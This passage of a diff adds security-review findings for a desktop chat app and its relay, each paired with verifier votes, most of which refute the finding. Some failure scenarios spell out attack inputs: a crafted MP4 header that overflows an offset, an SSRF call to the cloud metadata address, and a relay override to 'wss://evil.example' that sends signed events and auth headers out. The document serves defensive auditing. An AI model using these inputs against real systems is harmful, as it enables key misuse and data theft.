+  "line": 481,
+  "severity": "medium",
+  "category": "integer-overflow",
+  "claim": "check_moov_before_mdat advances the top-level atom cursor with an unchecked `offset += atom_size`, where atom_size can be the raw 64-bit extended size straight from the file (only `extended < 16` is rejected at line 454-456). Its sibling walker validate_mp4_metadata_free is careful here \u2014 validation.rs:897 uses `off.checked_add(size).filter(|&v| v <= end)` \u2014 so this is an inconsistency inside the same file, not a deliberate choice.",
+  "failure_scenario": "Attacker PUTs a 32-byte body: a well-formed 16-byte `ftyp`/`isom` box (so looks_like_mp4_iso_bmff at upload.rs:399 passes and routes to the video pipeline) followed by `00 00 00 01 'm' 'o' 'o' 'v' FF FF FF FF FF FF FF FF`. Entry: buzz-relay/src/api/media.rs:344 process_video_upload -> upload.rs:421 -> validation.rs:293 check_moov_before_mdat, which is the FIRST validator and runs before the checked walker. compact_size==1 so atom_size = u64::MAX; offset (16) + u64::MAX overflows. With overflow-checks on (dev/test) this panics inside spawn_blocking -> MediaError::Internal -> HTTP 500. With them off it wraps to 15, the cursor moves backwards, and the scanner re-reads misaligned garbage until the MAX_ATOMS=1024 guard fires and returns MoovNotAtFront \u2014 a misleading error for the client and 1024 wasted seek+read syscalls per request.",
+  "evidence": "        offset += atom_size;",
+  "confidence": "high",
+  "reported_slice": "media (crates/buzz-media)",
+  "gate_a": "evidence found near claimed line 481",
+  "reported_by": [
+   ".None/None"
+  ],
+  "duplicate_count": 2,
+  "id": "F039",
+  "votes": [
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The unchecked `offset += atom_size` at crates/buzz-media/src/validation.rs:481 exists as quoted, and the checked sibling at :897 exists too, but neither failure the finding describes occurs in a shipped build. (1) The panic branch requires overflow-checks. The workspace Cargo.toml defines only [profile.ci] (:145) and [profile.sprig] (:158) and never sets overflow-checks or debug-assertions anywhere in the repo (grep over *.toml returns only a prose comment at Cargo.toml:142), and the shipped relay is built with `cargo build --release --locked -p buzz-relay` (Dockerfile:70), where Rust's default is overflow-checks=off. So the spawn_blocking panic -> MediaError::Internal -> HTTP 500 chain does not exist in the artifact that ships. (2) The wrapping branch is already fenced: on wrap the cursor moves backwards, but the loop is capped by MAX_ATOMS=1024 at validation.rs:413/427 and fails closed with MediaError::MoovNotAtFront (:430) \u2014 a rejection, not a bypass. The cost is at most 1024 seek+read_exact pairs against an already-open, page-cached file of a few dozen bytes, which is not a usable amplification vector. (3) No validation bypass is enabled: a huge non-overflowing atom_size already lets the cursor jump past mdat to EOF without any arithmetic bug, and the mp4 crate re-parses the file at :312 regardless. This is an internal consistency nit, not a reachable defect.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The unchecked `offset += atom_size` at crates/buzz-media/src/validation.rs:481 is real, but no shipped build suffers a meaningful consequence. (1) The panic half of the scenario needs `overflow-checks`; the workspace Cargo.toml defines no `[profile.release] overflow-checks` (only `profile.ci` and `profile.sprig`, both `inherits = \"release\"`, at Cargo.toml:145-161), so release/ci/sprig binaries wrap rather than panic \u2014 a dev-only assertion is not an attacker gain. (2) In the wrapping case the loop is already hard-bounded: `atoms_scanned > MAX_ATOMS` (1024) returns `MediaError::MoovNotAtFront` (validation.rs:426-431), and each iteration is one seek plus an 8-byte read on a file the attacker had to upload anyway \u2014 1024 tiny reads is not a DoS primitive next to the upload itself. (3) It fails closed: the wrapped cursor cannot turn a reject into an accept. (4) The 'misleading error' is not a security effect, and the check is trivially short-circuited without any overflow anyway \u2014 any malformed size (`compact_size < 8`, extended `< 16`, or a short read) simply `break`s to `Ok(())` at validation.rs:454-466, so an attacker wanting to hide an mdat needs no integer trick at all. Nothing is gained beyond what plain malformed input already yields.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The quoted line is real (crates/buzz-media/src/validation.rs:481, `offset += atom_size`) and the inconsistency with the sibling walker is real (validation.rs:897 uses `off.checked_add(size).filter(|&v| v <= end)`), but neither described failure occurs in a shipped build. (1) The panic branch requires overflow-checks. The workspace root Cargo.toml defines only `[profile.ci]` (line 145, `inherits = \"release\"`) and `[profile.sprig]` (line 158); there is no `[profile.release]` and no `overflow-checks` key anywhere, and .cargo/config.toml sets only `[profile.dev] debug`. Shipped builds are `cargo build --release` (Dockerfile:68-70), where overflow-checks defaults to false \u2014 so `16 + u64::MAX` wraps, it does not panic. There is no HTTP 500 and no MediaError::Internal. Even profile.ci inherits release, so CI e2e does not panic either; only `cargo test` on the dev profile would, and a dev-profile-only abort is not a shipped-build failure. (2) The wrap branch is harmless and self-bounding. offset becomes 15, the loop re-enters at `while offset < file_size` (validation.rs:425), and `atoms_scanned > MAX_ATOMS` (validation.rs:427-431, MAX_ATOMS = 1024) fires and returns `MediaError::MoovNotAtFront`, i.e. the request is rejected \u2014 the fail-closed outcome the guard was written for. The 'cost' is at most 1024 seeks plus 8-16 byte reads on an already-open file handle, orders of magnitude cheaper than persisting the uploaded body that preceded it, so there is no DoS. (3) The overflow buys no bypass either: a plain non-overflowing large size (e.g. compact_size = 0xFFFFFFFF) already jumps `offset` past file_size and exits the loop with Ok(()), so overflow adds no capability that ordinary trusted-size arithmetic does not already grant, and `validate_mp4_metadata_free` (validation.rs:293-onward) plus `Mp4Reader::read_header` still run afterward. This is a code-hygiene inconsistency worth fixing, not a reachable security failure.",
+    "path": ""
+   }
+  ],
+  "keep_votes": 0,
+  "vote_count": 3
+ },
+ {
+  "file": "desktop/src/features/messages/hooks.ts",
+  "line": 678,
+  "severity": "medium",
+  "category": "state-consistency",
+  "claim": "useDeleteMessageMutation.onSuccess removes the deleted message only from the flattened channelMessagesKey cache, not from the window store \u2014 violating the codebase's own documented invariant (channelWindowStore.ts:229-238 and the edit mutation's comment at hooks.ts:745-747 both state that patches applied only to the flattened array are silently reverted by the next live merge). The deleted row is resurrected by the next projection.",
+  "failure_scenario": "User deletes their message (DeleteMessageConfirmDialog \u2192 useDeleteMessageMutation). onSuccess filters it out of channelMessagesKey, but the event remains in the ChannelWindowStore pages/liveOverlay. Any subsequent live event in the channel (any member sending a message triggers appendMessage at hooks.ts:264 \u2192 mergeLiveChannelWindowEvent \u2192 projectChannelWindowMessages \u2192 reconcileChannelWindowMessages, which re-emits every window event as authoritative) puts the deleted message back into the rendered timeline. It stays visible until the relay's kind-5/9005 deletion aux event arrives and formatTimelineMessages suppresses it; if that push is missed (brief disconnect at delete time), the deleted message remains visible until the next head refetch. The sibling edit mutation (hooks.ts:748-752) was explicitly fixed for this exact bug class via mapChannelWindowEvents; the delete path was not.",
+  "evidence": "      queryClient.setQueryData<RelayEvent[]>(\n        channelMessagesKey(channel.id),\n        (current = []) => current.filter((message) => message.id !== eventId),\n      );",
+  "confidence": "high",
+  "reported_slice": "desktop-messages",
+  "gate_a": "evidence found near claimed line 678",
+  "reported_by": [
+   ".None/None"
+  ],
+  "duplicate_count": 1,
+  "id": "F042",
+  "votes": [
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The asymmetry the reporter describes is real code (delete's onSuccess touches only channelMessagesKey at desktop/src/features/messages/hooks.ts:676-680 while edit also maps the window store at hooks.ts:745-752), but it is a local rendering-latency nit, not a security defect, and there is no attacker anywhere in the path. The deletion already succeeded at the relay before onSuccess runs (hooks.ts:670-674 awaits deleteMessage), so no other user ever sees the row; the only display affected is the deleting user's own client. The suppression the reporter treats as a fragile fallback is the normal live path: kind:5 and kind:9005 are both in CHANNEL_AUX_EVENT_KINDS (desktop/src/shared/constants/kinds.ts:112-117), the same subscription that delivers the next live message delivers the deletion aux event (hooks.ts:293), and formatTimelineMessages suppresses deletion targets. So the worst case is that the author's own screen briefly re-shows a row they just deleted until the echo arrives, self-healing on the next head refetch. No confidentiality, integrity, or availability gain for any party.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The code quote is accurate and the delete path genuinely does not use mapChannelWindowEvents, but the claimed durable failure ('deleted message remains visible') does not occur, and it is not a security boundary in any case. Deletions are aux kinds carried on the same live subscription the resurrection depends on: desktop/src/shared/constants/kinds.ts:112-117 puts KIND_DELETION (5) and KIND_NIP29_DELETE_EVENT (9005) in CHANNEL_AUX_EVENT_KINDS, hooks.ts:293 admits them, and hooks.ts:304 merges them into the window store via mergeLiveChannelWindowEvent. Rendering then suppresses the row unconditionally \u2014 desktop/src/features/messages/lib/formatTimelineMessages.ts:207-255 builds deletedEventIds from kind:5/9005 and filters `isTimelineContentEvent(event) && !deletedEventIds.has(event.id)`. The deletion event is produced by the relay as the direct result of the just-succeeded submit (desktop/src-tauri/src/commands/messages.rs:960-971 build_delete_compat + submit_event), so it is pushed ahead of any later member message that would trigger the projection. The stated escape hatch (missed push during a disconnect) is itself covered: hooks.ts:258-262 registers relayClient.subscribeToReconnects -> refreshChannelWindowMessages, which refetches the window including aux and re-suppresses. Worst realistic outcome is a sub-second flicker in the deleter's own client; the relay-side deletion is unaffected and no other user sees anything.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": false,
+    "severity": "low",
+    "reasoning": "The described asymmetry is real. `useDeleteMessageMutation.onSuccess` (desktop/src/features/messages/hooks.ts:676-681) patches only `channelMessagesKey`; it never touches `channelWindowKey`. The window store is the declared source of truth \u2014 `mapChannelWindowEvents`'s doc comment (desktop/src/features/messages/lib/channelWindowStore.ts:229-238) states verbatim that a patch applied only to the flattened array is reverted by the next live merge, and the sibling edit mutation was fixed exactly that way (hooks.ts:748-752). The revert mechanism checks out: any live event -> hooks.ts:299-308 mergeLiveChannelWindowEvent + projectChannelWindowMessages -> lib/projectChannelWindow.ts:18-22 -> reconcileChannelWindowMessages (lib/channelWindowReconciliation.ts:26-48) re-emits every flattened window event as authoritative, and the deleted event is still in the store. Downgraded to low: this is a local render-state glitch on the deleter's own screen only. The deletion is authoritative at the relay, other clients are unaffected, and the row is re-suppressed as soon as the kind:5/9005 marker lands (formatTimelineMessages.ts:207-255) or on the next head refetch (replaceNewestChannelWindow, channelWindowStore.ts:100-118, plus the aux backfill in lib/auxBackfill.ts). It fails visible, not leaky \u2014 no confidentiality or authorization impact.",
+    "path": "user deletes own message -> desktop/src/features/messages/hooks.ts:670-673 delete_message succeeds -> hooks.ts:676-681 filters only channelMessagesKey (window store untouched) -> any subsequent live channel event -> hooks.ts:299-308 mergeLiveChannelWindowEvent + projectChannelWindowMessages -> desktop/src/features/messages/lib/projectChannelWindow.ts:18-22 -> lib/channelWindowReconciliation.ts:30-46 re-flattens the still-present event over the filtered array -> deleted row rendered again until the 5/9005 marker arrives (lib/formatTimelineMessages.ts:207-255)"
+   }
+  ],
+  "keep_votes": 1,
+  "vote_count": 3
+ },
+ {
+  "file": "desktop/src-tauri/src/commands/profile.rs",
+  "line": 111,
+  "severity": "medium",
+  "category": "nip98-token-issued-to-arbitrary-host",
+  "claim": "`update_profile_at_relay` takes `relay_url` verbatim from the renderer and passes it through `relay_http_base_url` \u2014 which does no scheme, host, or allowlist validation and returns any non-ws string unchanged (relay.rs:73-85) \u2014 then hands the result to `query_relay_at_with_keys` and `submit_event_at_with_keys`. Both mint a NIP-98 `kind:27235` Authorization header signed with the user's real identity key (relay.rs:354, relay/submit.rs:29) and POST it to that host. There is no confirmation, no https requirement, and no check that the URL is a workspace the user has ever configured.",
+  "failure_scenario": "A compromised renderer calls `update_profile_at_relay({relay_url: \"http://169.254.169.254\", expected_pubkey: <the real pubkey from get_identity()>, expected_avatar_url: null, avatar_url: \"x\"})`. `capture_expected_signer` passes because the pubkey does match the live identity. The desktop then POSTs to `http://169.254.169.254/query` with an `Authorization: Nostr <base64 kind:27235 signed by the user's identity key>` header \u2014 an authenticated SSRF from the desktop process into cloud metadata / localhost / LAN services, plus delivery of a freshly signed HttpAuth event whose `u` tag is attacker-chosen, to a host the attacker controls. On the submit leg it also publishes a signed kind:0 profile event for the user's real identity at that host. Note `query_relay_at_with_keys` is also the one relay egress path that carries no `egress_guard::assert_no_key_backup_bytes` call, unlike relay/submit.rs:28 and relay.rs:570.",
+  "evidence": "    let signer = capture_expected_signer(&state, &expected_pubkey)?;\n\n    let api_base_url = relay_http_base_url(&relay_url);",
+  "confidence": "high",
+  "reported_slice": "tauri-commands (buzz/desktop/src-tauri/src/commands) \u2014 Lens B: cryptography, keys, identity",
+  "gate_a": "evidence found near claimed line 111",
+  "reported_by": [
+   ".None/None"
+  ],
+  "duplicate_count": 1,
+  "id": "F043",
+  "votes": [
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The premise is renderer compromise, and under that premise the attacker already holds the private key outright, so this command grants nothing incremental. create_ncryptsec_backup is a plain Tauri command taking a renderer-chosen password and returning the ncryptsec1 blob straight to the renderer (desktop/src-tauri/src/commands/identity.rs:243-254 -> create_backup_with_log_n at identity.rs:216-234) \u2014 a compromised renderer calls it with its own passphrase and decrypts the user's real nsec offline. Signing an extra kind:27235 for an attacker host is strictly weaker than that. The arbitrary relay_url is also the app's architecture, not an oversight in this one function: agents_deploy.rs:110, identity.rs:643, join_policy.rs:34, pairing.rs:232 and workspace.rs:52/77/128 all take a renderer-supplied relay URL, because the workspace list lives in the renderer's localStorage. The SSRF framing does not survive either: NIP-98 headers bind the target in the `u` tag (desktop/src-tauri/src/relay.rs:105-110), so the signed header is useless against the real relay; the request is a POST to <host>/query whose response must parse as a JSON array of nostr events (relay.rs:365-371), so it is effectively a blind POST \u2014 no metadata-service read primitive \u2014 and the webview itself can already issue arbitrary cross-origin POSTs. The missing egress_guard on query_relay_at_with_keys is accurate but inert: the body is a serialized filter (relay.rs:346-348), never key-backup bytes; the guard exists on the paths that carry event JSON (relay/submit.rs:28, relay.rs:570).",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The only stated entry point is 'a compromised renderer', which is assumed, not demonstrated \u2014 and in this app it is not reachable from any remote peer. The single shipped caller chain is desktop/src/features/profile/avatarProfileSync.ts:230 (saveProfile: updateProfileAtRelay) fed by registerAvatarWhenReady at desktop/src/features/onboarding/ui/CommunityOnboardingFlow.tsx:411, whose `relayUrl: transaction.relayUrl` is the community relay the user themselves selected or approved; the deep-link path only prefills a dialog the user must confirm (desktop/src/features/communities/addCommunityPrefill.ts:13-53, requestAddCommunityPrefill -> useAddCommunityDialogState). So `relay_url` is set by trusted local code from user-chosen configuration, never by a remote peer. I also looked for the XSS sink that a 'compromised renderer' would need: the only dangerouslySetInnerHTML in the desktop app is desktop/src/features/messages/ui/BotIdenticon.tsx:31, which injects jdenticon-generated SVG from a pubkey/name, not remote markup. Absent an IPC-reaching attacker, minting a NIP-98 header for the relay the user deliberately joined is the designed behavior, and any actor able to call update_profile_at_relay can already call submit_event/query_relay directly \u2014 so nothing is gained at that point. The missing scheme/host validation in relay.rs:73-85 and the missing egress_guard call on query_relay_at_with_keys are worth hardening, but they are defense-in-depth, not a reachable vulnerability.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The mechanical read (relay_http_base_url does no validation, relay.rs:73-85) is correct, but the finding asserts a boundary that does not exist in this app, and its supporting details are wrong. (1) No attacker entry point is shown. The Tauri IPC surface is granted to one window only \u2014 desktop/src-tauri/capabilities/default.json declares `\"windows\": [\"main\"]` \u2014 so untrusted/remote content in any other webview cannot invoke commands. 'A compromised renderer' is assumed, not demonstrated. (2) Even granting it, no privilege is gained: the same renderer can call `import_identity` (desktop/src-tauri/src/commands/identity.rs:335-388), which takes an arbitrary nsec and DURABLY replaces the signing key, and `create_ncryptsec_backup` (identity.rs:243). An attacker who can call update_profile_at_relay already owns the identity outright, so signing one NIP-98 header for a chosen host is strictly weaker than what is already available by design. (3) Arbitrary relay hosts are a product requirement \u2014 self-hosted community relays are chosen by the user and applied through apply_workspace; every ordinary call carries the same NIP-98 header (relay.rs:101-140), so the header is not a leaked secret, it is a per-request signature over that URL. (4) The egress_guard remark is mis-scoped: egress_guard.rs:5-24 documents the guard as covering /events submission bodies against ncryptsec leakage, and this command's submit leg does pass through relay/submit.rs:28; the query body here is backend-constructed JSON filters (profile.rs:107-111) that contain only a kind and a pubkey \u2014 no key material can appear there. (5) `capture_expected_signer` (profile.rs:165-171) is not a bypassed check \u2014 it is a staleness guard that pins the deferred avatar save to the identity that queued it (avatarProfileSync.ts:16-21).",
+    "path": ""
+   }
+  ],
+  "keep_votes": 0,
+  "vote_count": 3
+ },
+ {
+  "file": "desktop/src-tauri/src/commands/workspace.rs",
+  "line": 176,
+  "severity": "medium",
+  "category": "unauthenticated-identity-swap",
+  "claim": "`apply_workspace` is a plain Tauri command that accepts an arbitrary `nsec: Option<String>` from the renderer and installs the parsed keypair as the process-wide signing identity, and an arbitrary `relay_url: String` as the global relay override \u2014 with no validation beyond `Keys::parse`, no user confirmation, and no check that the pair corresponds to a workspace the user actually configured. Unlike `import_identity` (identity.rs:336-388) it takes no `identity_mutation` guard around the swap and performs no durable persistence, so the swap is silent and invisible to the identity UI.",
+  "failure_scenario": "A compromised renderer calls `apply_workspace({relay_url: \"wss://evil.example\", nsec: null, repos_dir: null})`. Every later `submit_event` and `query_relay` resolves through `relay_api_base_url_with_override` (relay.rs:50-55) to the attacker's host, so all subsequent events signed with the user's real key \u2014 and every NIP-98 Authorization header built by `build_nip98_auth_header` (relay.rs:101-109) \u2014 are delivered to the attacker, and every read the app performs returns attacker-chosen events. Alternatively, passing an attacker-generated `nsec` replaces the live signing identity in memory: subsequent user actions are signed by a key the attacker holds while `get_identity` reports the substituted pubkey as if it were the user's own, and `create_ncryptsec_backup` would encrypt and hand back the substituted key. Because nothing is persisted, the swap disappears on restart and leaves no trace.",
+  "evidence": "        if let Some(keys) = parsed_keys {\n            let mut keys_guard = state.keys.lock().map_err(|e| e.to_string())?;\n            *keys_guard = keys;\n        }",
+  "confidence": "high",
+  "reported_slice": "tauri-commands (buzz/desktop/src-tauri/src/commands) \u2014 Lens B: cryptography, keys, identity",
+  "gate_a": "evidence found near claimed line 176",
+  "reported_by": [
+   ".None/None"
+  ],
+  "duplicate_count": 1,
+  "id": "F044",
+  "votes": [
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "Same collapse as F043, and more so: the renderer already has a strictly more powerful, persisting version of the exact operation this finding describes. import_identity is itself a plain Tauri command taking an arbitrary nsec from the renderer with no confirmation (desktop/src-tauri/src/commands/identity.rs:336-388) and it *durably* writes the substituted key to the keyring/identity.key, so 'silent in-memory-only swap' is a weaker capability than what is already exposed; and create_ncryptsec_backup (identity.rs:243) hands the real key back to the renderer, so a compromised renderer does not need to substitute anything. The relay override is the documented design of the workspace model \u2014 the frontend owns the community list and calls apply_workspace on every init (desktop/src/shared/api/tauri.ts:1145-1157, useCommunityInit.ts:213) \u2014 and the code deliberately no longer accepts a persisted nsec from that store: Community.nsec is typed `never` (desktop/src/features/communities/types.ts:26) and loadCommunities strips any legacy nsec from localStorage (communityStorage.ts:60-77) precisely so identity.key stays the source of truth. Redirecting relay traffic buys the attacker NIP-98 headers whose `u` tag pins them to the attacker's own host (desktop/src-tauri/src/relay.rs:105-110), not replayable against the real relay, plus a view of traffic the compromised renderer already renders. No escalation.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "Same unreachable premise, and the code contradicts the specific scenario. apply_workspace is the documented app-init path (desktop/src-tauri/src/commands/workspace.rs:113-125) and its only shipped caller deliberately passes no nsec: desktop/src/features/communities/useCommunityInit.ts:205-215 calls applyCommunity(activeCommunity.relayUrl, undefined, ...) with an explicit comment that the persisted identity.key resolved by resolve_persisted_identity is the single source of truth, that loadCommunities() strips lingering `nsec` fields from legacy entries, and that 'this site refuses to apply one even if present'. `relay_url` likewise comes from the locally stored active community the user selected (deep links only prefill a dialog requiring confirmation \u2014 desktop/src/features/communities/addCommunityPrefill.ts:13-53). So both claimed attacker inputs are supplied by trusted local code and never by a remote peer. The finding again relies on an assumed compromised renderer, for which I found no sink (the only dangerouslySetInnerHTML is jdenticon SVG at desktop/src/features/messages/ui/BotIdenticon.tsx:31); an attacker already executing arbitrary IPC could call create_ncryptsec_backup or submit_event directly, so the identity swap grants nothing new. The absent identity_mutation guard relative to import_identity (identity.rs) is a consistency observation, not a reachable attack.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "Refuted on the same boundary grounds plus a factual error. The relay override and optional nsec are the intended workspace-apply mechanism, not a hole: the frontend deliberately passes NO nsec \u2014 desktop/src/features/communities/useCommunityInit.ts:205-218 documents that the persisted identity.key file is the single source of truth and that legacy nsec fields are stripped from stored communities, and it is the only caller of applyCommunity (tauri.ts:1145-1157). So the parameter is vestigial, and removing it is at most a dead-code hardening chore. The finding's own comparison undercuts it: `import_identity` (desktop/src-tauri/src/commands/identity.rs:335-388) is an equally plain command accepting an arbitrary nsec from the renderer and replacing the identity DURABLY, with the mutation guard and keyring persistence \u2014 i.e. the renderer is trusted with the key by design, and apply_workspace's in-memory swap is a strictly weaker primitive an attacker would never need. There is also no demonstrated attacker entry point: IPC is scoped to the single main window (desktop/src-tauri/capabilities/default.json, `\"windows\": [\"main\"]`), so reaching apply_workspace requires script execution inside the app's own bundled frontend, which is not shown and which would already yield import_identity, submit_event, and create_ncryptsec_backup. Finally, pointing the relay override at a user-chosen host (relay.rs:32-55) is exactly the self-hosted-community feature, not a swap of an authenticated destination.",
+    "path": ""
+   }
+  ],
+  "keep_votes": 0,
+  "vote_count": 3
+ },
+ {
+  "file": "desktop/src-tauri/src/commands/messages.rs",
+  "line": 231,
+  "severity": "medium",
+  "category": "pagination",
+  "claim": "`get_forum_posts` hands the frontend a bare `created_at` cursor, which it feeds back as `until` on the next call. `until` without `before_id` compiles to `created_at <= u` in crates/buzz-db/src/event.rs:505-506 \u2014 inclusive \u2014 so every page re-returns its own boundary post, and a `created_at` second holding a full page of posts makes the cursor unable to advance at all. This is the exact wall that `get_channel_messages_before` in the same file documents (lines 409-423) and fixes with a `(until, before_id)` composite; the forum reader never got the fix.",
+  "failure_scenario": "A forum channel receives 20+ kind:45001 posts inside one second (a migration, a bulk import, or an agent burst). The user opens the forum with the default cap of 20, gets 20 posts, and clicks 'Load more'. The frontend sends `before = last.created_at`; the relay's SQL becomes `created_at <= that_second ORDER BY created_at DESC LIMIT 20` and returns the identical 20 rows. Every subsequent 'Load more' returns the same page forever \u2014 the rest of the forum's history is unreachable, and the list visibly duplicates the boundary post even in the ordinary case.",
+  "evidence": "    let next_cursor = messages.last().map(|m| m.created_at);",
+  "confidence": "high",
+  "reported_slice": "tauri-commands (deep pass, Lens C \u2014 correctness)",
+  "gate_a": "evidence found near claimed line 231",
+  "reported_by": [
+   ".None/None"
+  ],
+  "duplicate_count": 1,
+  "id": "F045",
+  "votes": [
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The command-level mechanics check out (buzz-db/src/event.rs:505-506 does compile a bare `until` to inclusive `created_at <= u`, and messages.rs:231 returns a timestamp-only cursor), but the described failure requires a caller that feeds `next_cursor` back as `before` \u2014 and no such caller exists in the shipped build. The only production caller of `get_forum_posts` is `useForumPostsQuery` (desktop/src/features/forum/hooks.ts:29), which always invokes `getForumPosts(channelId, 50, undefined, relaySelfPubkey)` \u2014 `before` is hard-wired undefined \u2014 and a search of desktop/src shows the response's `nextCursor` is never consumed anywhere: there is no 'Load more' control in the forum feature (no nextCursor/fetchNextPage/loadMore references under desktop/src/features/forum). The forum list is a single fixed 50-post page refetched on a 15s interval. The claimed stuck-pagination loop and duplicated boundary post therefore cannot occur; the inclusive cursor is a latent defect in an API surface whose paging half was never wired up. (The e2eBridge reference is test-only; the mobile app does not invoke this Tauri command.)",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The backend half of the claim is accurate as far as it goes: get_forum_posts (desktop/src-tauri/src/commands/messages.rs:210-236) sets a bare `until` with no `before_id`, the relay compiles that to inclusive `created_at <= u` (crates/buzz-db/src/event.rs:504-507), and next_cursor is just last.created_at (messages.rs:231). But the described failure \u2014 a user clicking 'Load more' and looping on the same page \u2014 cannot occur in a shipped build because no code ever feeds the cursor back. The only production caller is useForumPostsQuery (desktop/src/features/forum/hooks.ts:26-32), which hard-codes getForumPosts(channelId, 50, undefined, ...) \u2014 `before` is always undefined. The nextCursor field is deserialized in desktop/src/shared/api/forum.ts:139 and then never read: grep for nextCursor / loadMore / fetchNextPage across desktop/src/features/forum returns zero matches. There is no 'Load more' control, no infinite-query hook, no pagination of forum posts at all (the other reference, desktop/src/testing/e2eBridge.ts:11714, is test scaffolding). So neither the pagination loop nor the 'visibly duplicated boundary post' in 'the ordinary case' is reachable \u2014 the ordinary case sends no `until` whatsoever. This is a latent wart in an unused API field, not an occurrable failure; the concrete scenario the finding describes is fiction for the shipped UI.",
+    "path": ""
+   },
+   {
+    "lens": null,
+    "refuted": true,
+    "severity": "none",
+    "reasoning": "The API-shape flaw is real in isolation (bare created_at cursor at desktop/src-tauri/src/commands/messages.rs:231; `until` without `before_id` compiles to inclusive `created_at <= u` at crates/buzz-db/src/event.rs:505-506). But the described failure requires a caller that feeds next_cursor back as `before`, and no shipped code does: the sole production consumer is useForumPostsQuery at desktop/src/features/forum/hooks.ts:29, which calls getForumPosts(channelId, 50, undefined, ...) \u2014 `before` is always undefined and the returned nextCursor is discarded. There is no forum 'Load more' in the UI (grep across desktop/src finds no consumer of the forum nextCursor outside the api wrapper and the e2e test bridge). Therefore the stuck-cursor wall and the 'visibly duplicates the boundary post even in the ordinary case' claim cannot manifest in a shipped build \u2014 only one page is ever fetched. Latent API defect worth fixing if forum paging is ever wired up, but the reported failure scenario is unreachable today.",
+    "path": ""
+   }
+  ],
+  "keep_votes": 0,
+  "vote_count": 3
+ }
+]
